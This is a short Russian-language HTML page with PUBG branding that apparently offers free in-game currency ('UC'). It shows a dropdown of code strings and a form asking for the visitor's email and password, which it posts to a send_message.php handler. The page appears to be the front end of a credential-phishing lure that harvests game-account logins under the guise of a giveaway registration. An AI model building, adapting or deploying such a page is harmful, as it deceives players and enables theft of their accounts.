<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" href="/img/logoPubgpng.png" type="image/png">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css?family=Inter:300,regular,500" rel="stylesheet" />
    <link rel="stylesheet" href="/styles/get-uc.css">
    <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans+Condensed:300,regular,500" rel="stylesheet" />

    <title>Регистрация</title>
</head>
<body>
    <div class="content">
        <img src="/img/page2Logo.png" alt="">
        <form action="send_message.php" method="POST" class="form">
            <select name="code" class="code media">
                <option value="Код" class="codes">f80ju3d</option>
                <option value="Код"class="codes">g27dt7g</option>
                <option value="Код"class="codes">k46va9m</option>
                <option value="Код"class="codes">n71bd5a</option>
                <option value="Код"class="codes">j39rt4s</option>
                <option value="Код"class="codes">h55fp0w</option>
            </select>

            <div class="shadow__code"></div>
            <input type="email" class="email__input email media req" name="E-Mail" placeholder="Электронный адрес" required>
            <div class="shadow__code"></div>
            <input type="text" class="email__input password media req" name="Пароль" placeholder="Пароль" required>
            <div class="shadow__code"></div>

            <div class="buttons"> 
                <button type="submit" class="send-form a" >Отправить</button>
                <a href="/index.html" class="back a">Назад </a>
            </div>
            <div class="status"></div>
        </form>
    </div>  
    
    <script src="js/send_script.js"></script>
</body>
</html>
